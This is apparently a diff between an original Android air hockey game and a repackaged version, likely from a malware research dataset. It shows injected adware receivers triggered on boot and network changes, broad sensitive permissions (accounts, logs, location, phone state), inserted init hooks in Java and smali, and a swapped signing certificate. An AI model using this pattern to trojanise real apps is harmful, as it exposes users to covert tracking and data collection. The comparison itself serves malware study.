@@ -1,0 +1,284 @@
+diff -r result/APP_77/App_B_77/AndroidManifest.xml result/APP_77/App_M_77/AndroidManifest.xml
+18a19,46
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.kuguo.ad.MainActivity" android:theme="@android:style/Theme.Dialog"/>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.kuguo.ad.BoutiqueActivity" android:theme="@android:style/Theme.Dialog"/>
+>         <service android:name="com.kuguo.ad.MainService"/>
+>         <receiver android:name="com.kuguo.ad.MainReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="net.crazymedia.iad.AdPushActivity"/>
+>         <receiver android:name="net.crazymedia.iad.AdPushReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="net.crazymedia.iad.AdPushService"/>
+>         <meta-data android:name="UMENG_APPKEY" android:value="500fc8cf5270155c50000017"/>
+>         <meta-data android:name="UMENG_CHANNEL" android:value="gfan"/>
+19a48,61
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="com.android.vending.BILLING"/>
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.READ_LOGS"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+>     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+diff -r result/APP_77/App_B_77/apktool.yml result/APP_77/App_M_77/apktool.yml
+2c2
+< apkFileName: Bapp77-ACFDF7692C6246568C5CA46EF7801916C38AEAE43E068B189830A9450AB47B2F.apk
+---
+> apkFileName: Mapp77-3D236B2A21DB5BB5D704A6A55B4A49F145EECE8F5FBF1825D8B0E31FB1E0EF20.apk
+5d4
+< - resources.arsc
+7d5
+< - ogg
+9a8
+> - ogg
+Somente em result/APP_77/App_M_77/assets: AGENCYB.TTF
+Somente em result/APP_77/App_M_77/assets: AGENCYR.TTF
+Somente em result/APP_77/App_M_77/assets: kuguo_res
+Somente em result/APP_77/App_M_77/com: gamegod
+diff -r result/APP_77/App_B_77/com/hyperkani/airhockey/AirHockeyMainMenuNormal.java result/APP_77/App_M_77/com/hyperkani/airhockey/AirHockeyMainMenuNormal.java
+31a32
+> import com.gamegod.touydig;
+624a626
+>     touydig.init(this);
+670a673
+>     touydig.destroy(this);
+Somente em result/APP_77/App_M_77/com: kuguo
+Somente em result/APP_77/App_M_77/com: umeng
+Somente em result/APP_77/App_M_77/: net
+Os arquivos binários result/APP_77/App_B_77/original/AndroidManifest.xml e result/APP_77/App_M_77/original/AndroidManifest.xml são diferentes
+Somente em result/APP_77/App_B_77/original/META-INF: CERT.RSA
+Somente em result/APP_77/App_B_77/original/META-INF: CERT.SF
+diff -r result/APP_77/App_B_77/original/META-INF/MANIFEST.MF result/APP_77/App_M_77/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0 (Sun Microsystems Inc.)
+5c5
+< SHA1-Digest: O+EjMmlm6u4GDvkiz8tu5+RTUKo=
+---
+> SHA1-Digest: HPJuytVsH8B1tnzt/82dZYg7GiI=
+8c8
+< SHA1-Digest: Qqp9qfvzPd6mSQJs88nDj7Py+64=
+---
+> SHA1-Digest: rh3moUvmAcx/9OP7dw5EFIHjuKs=
+12a13,18
+> Name: assets/kuguo_res/rating_half.png
+> SHA1-Digest: S00vYSJAZN4Kp03dNJ9JV3C7gyA=
+> 
+> Name: assets/kuguo_res/spot_light.png
+> SHA1-Digest: HDYglOL1e3Rk0VmuY8QCQ0oNoTs=
+> 
+17c23
+< SHA1-Digest: jFy+l7r7f2nZgdYtKVf0w4pds6U=
+---
+> SHA1-Digest: SWICucRzck6Tp0oywGJv5Rs8od8=
+20c26
+< SHA1-Digest: LYCdBBczBJ+HdO/hafKbf2SkCaY=
+---
+> SHA1-Digest: OwHsxtnn9MTBlS8cQqyU+aSBIIo=
+23c29
+< SHA1-Digest: Zpj8exxXzLQ4istbbwhEeo39u1E=
+---
+> SHA1-Digest: MK8G6VdJVg2BbVjjaxdAcLW+NNU=
+26c32,35
+< SHA1-Digest: Zpj8exxXzLQ4istbbwhEeo39u1E=
+---
+> SHA1-Digest: MK8G6VdJVg2BbVjjaxdAcLW+NNU=
+> 
+> Name: assets/AGENCYB.TTF
+> SHA1-Digest: UIp4i9RemVNCgeT8ltLXtT2F7OM=
+29c38,41
+< SHA1-Digest: acY7CuGjO84yMRBuhdcd/FFCfas=
+---
+> SHA1-Digest: 3DcNFskKUarmP7h/5bxlZkG81ts=
+> 
+> Name: assets/kuguo_res/confirm_btn_pressed.png
+> SHA1-Digest: mNxr9OFpueKt9Rn83vsUCcm3roc=
+34,36d45
+< Name: res/drawable/menu_fullbg_dark.xml
+< SHA1-Digest: TGQbwTq7udCEzdPogEUivx9kay0=
+< 
+39a49,57
+> Name: res/drawable/menu_fullbg_dark.xml
+> SHA1-Digest: /yju8WS3y0HMQc8SqAaCS7tsDNk=
+> 
+> Name: assets/kuguo_res/kuguo_top_pressed.png
+> SHA1-Digest: /tDiKS+zIjOO9zZ1+KBFGJLvlxs=
+> 
+> Name: assets/kuguo_res/rating_full.png
+> SHA1-Digest: OrNYZwr7L4Fc/g6m44wteyioSI0=
+> 
+41c59
+< SHA1-Digest: KGpPsCbY42kkABISD7j0IeDmNnU=
+---
+> SHA1-Digest: +RKIgVX0wLGBHDH2TkvLu4i263I=
+44c62
+< SHA1-Digest: olcGts5Q4CDTjnIhTsaQQkFCtqk=
+---
+> SHA1-Digest: ZA+NLef5bby6fTvsRs0iuo7xPh4=
+47c65,68
+< SHA1-Digest: /2T//KRw3kT685mNOq/5BxPsyDE=
+---
+> SHA1-Digest: pcjJ1FCl8HMU6vFAj1wDLFgUbzs=
+> 
+> Name: assets/kuguo_res/kuguo_side.png
+> SHA1-Digest: /yJxD5QPHvZTl9gVzckrOwkqsVc=
+57a79,81
+> Name: assets/kuguo_res/snapshot_empty.png
+> SHA1-Digest: DSmTSCP3TKTP8Cw8/9byyIcYP28=
+> 
+59c83
+< SHA1-Digest: UA0G3776p/WT15KskWZVeDtnCLQ=
+---
+> SHA1-Digest: V64mYXLH/Y9msq3J7wdX8inZeNg=
+65,68c89
+< SHA1-Digest: 6pxf84DaKwdcuxD+AFbHi7V6+bY=
+< 
+< Name: res/drawable/menu_fullbg_darker.xml
+< SHA1-Digest: lu4QXF1+nyQ9T5fe08Q1cJ9cAkU=
+---
+> SHA1-Digest: lujwwAZN56tmA6tPzonRAvqnKBw=
+73,74c94,95
+< Name: res/drawable/menu_fullbg.xml
+< SHA1-Digest: 3zcnuAnCMF6Eh/b4J+K8mKZKfes=
+---
+> Name: res/drawable/menu_fullbg_darker.xml
+> SHA1-Digest: b9TpQ5js83+tQbrmVg2WMPWC74k=
+77c98,104
+< SHA1-Digest: RxsdDst3OItqvHZUvGIdRKMVVR4=
+---
+> SHA1-Digest: m51bjCq2TA8cFxWAeJbEfqwZBLs=
+> 
+> Name: res/drawable/menu_fullbg.xml
+> SHA1-Digest: fks38SyyAnPp7symCQ7IYn24QIs=
+> 
+> Name: assets/AGENCYR.TTF
+> SHA1-Digest: qR/OXN2U0fMIwdRH7mEq3tAw7qA=
+80c107
+< SHA1-Digest: msg3e0dS9GaKX10R79O4Pw/Q3Ac=
+---
+> SHA1-Digest: oZc/biK7h3SD9qjlTol/6Y/W+mo=
+87a115,117
+> Name: AndroidManifest.xml
+> SHA1-Digest: FBSRk3chpao8xkdqOYJkDQE64mo=
+> 
+89c119
+< SHA1-Digest: ATVnXGuGwbFToOwhKc2Zqnm+gis=
+---
+> SHA1-Digest: OfJjNMzlWFEaySgXOqaEljDUK4w=
+94,96d123
+< Name: AndroidManifest.xml
+< SHA1-Digest: XNrXjYRtW3ieF6Y2yk4cykFcDZA=
+< 
+98c125
+< SHA1-Digest: Wiwv6WEQeOEE8u1GIZCXASDBnaQ=
+---
+> SHA1-Digest: bXGHoCfuPwDkLFfIV4hb0ahmLDg=
+101c128
+< SHA1-Digest: 1N30Ygx0AumP4/x1MnGDfRJA4dQ=
+---
+> SHA1-Digest: KDTMKa9G+WTB+OrapVi4SUaTmTo=
+111a139,141
+> Name: assets/kuguo_res/kuguo.png
+> SHA1-Digest: RuPZmtaRC1tisx8zwArgndvGfA8=
+> 
+113c143
+< SHA1-Digest: cPtx9T6VJ5OPaCxlarnNy6ZR9+c=
+---
+> SHA1-Digest: YS0495dwlVFQ6u0X9IXeFflNS0Y=
+119c149,155
+< SHA1-Digest: AAP/uEhHCoevQnJ9x9AuN3gzDvs=
+---
+> SHA1-Digest: JALQFasoBlOl+vyoICx0WovR7mI=
+> 
+> Name: assets/kuguo_res/push_cancel_btn_pressed.png
+> SHA1-Digest: UhRfBMZZGUHgA1i0uGFbOWx4SEk=
+> 
+> Name: assets/kuguo_res/kuguo_side2.png
+> SHA1-Digest: TV5gKbN886OE4Zydpl4+L+LOYmU=
+122c158
+< SHA1-Digest: hSaj8q8TmEQyAnSF//Bzo4bwbnE=
+---
+> SHA1-Digest: N1zmxcqT+Ih+Oh6Q2RGlLvu3olk=
+132a169,171
+> Name: assets/kuguo_res/confirm_btn.png
+> SHA1-Digest: bKjU+M74YySS1qW5nxZ+v4udGCk=
+> 
+138a178,180
+> Name: assets/kuguo_res/download_btn2.png
+> SHA1-Digest: mnoiAMSb+9/PFWSZZ/2ThYkuDYs=
+> 
+140c182,188
+< SHA1-Digest: r9zbfhbz8izG1cjWAEvC5i9bHvY=
+---
+> SHA1-Digest: 84ThO5icLxvdCJvcobfBxjRV4AA=
+> 
+> Name: assets/kuguo_res/spot_default.png
+> SHA1-Digest: E4fi2Oiw3vnkWEnhps2hIa4+gp8=
+> 
+> Name: assets/kuguo_res/push_cancel_btn.png
+> SHA1-Digest: zQ+3kBPQs5wwK+CNfm0vSZe9VYc=
+150a199,201
+> Name: assets/kuguo_res/icon.png
+> SHA1-Digest: xojjGOMaFE9l5JGijGWsO/RgymY=
+> 
+159a211,216
+> Name: assets/kuguo_res/download_btn2_pressed.png
+> SHA1-Digest: JqsMeWSOWGXiCsvHrx3OJD5JLEM=
+> 
+> Name: assets/kuguo_res/fold_arrow.png
+> SHA1-Digest: aPV5nrym+b3yv4JxlPO9BHg6+k0=
+> 
+162a220,231
+> Name: assets/kuguo_res/360.png
+> SHA1-Digest: l+Fj8rnP63ymLQTbbTeI2n7q89k=
+> 
+> Name: assets/kuguo_res/installed.png
+> SHA1-Digest: i1GhQd02nmGumG0Efgq4KVtZY4I=
+> 
+> Name: assets/kuguo_res/rating_empty.png
+> SHA1-Digest: /pdjhl209wEvFa24abz75d7jrts=
+> 
+> Name: assets/kuguo_res/kuguo_top.png
+> SHA1-Digest: +stugZmNOH1w3MN6Y0DAYL5g8zk=
+> 
+164c233
+< SHA1-Digest: 2KHm2kqxhyt3oRR+fksX2sMlKLs=
+---
+> SHA1-Digest: gM/Qt4iKDdksnENSnMzTVotUscQ=
+Somente em result/APP_77/App_M_77/original/META-INF: RANGFEI.RSA
+Somente em result/APP_77/App_M_77/original/META-INF: RANGFEI.SF
+Somente em result/APP_77/App_M_77/smali/com: gamegod
+diff -r result/APP_77/App_B_77/smali/com/hyperkani/airhockey/AirHockeyMainMenuNormal.smali result/APP_77/App_M_77/smali/com/hyperkani/airhockey/AirHockeyMainMenuNormal.smali
+2845a2846,2847
+>     invoke-static {p0}, Lcom/gamegod/touydig;->init(Landroid/content/Context;)V
+> 
+3023a3026,3027
+> 
+>     invoke-static {p0}, Lcom/gamegod/touydig;->destroy(Landroid/content/Context;)V
+Somente em result/APP_77/App_M_77/smali/com: kuguo
+Somente em result/APP_77/App_M_77/smali/com: umeng
+Somente em result/APP_77/App_M_77/smali: net
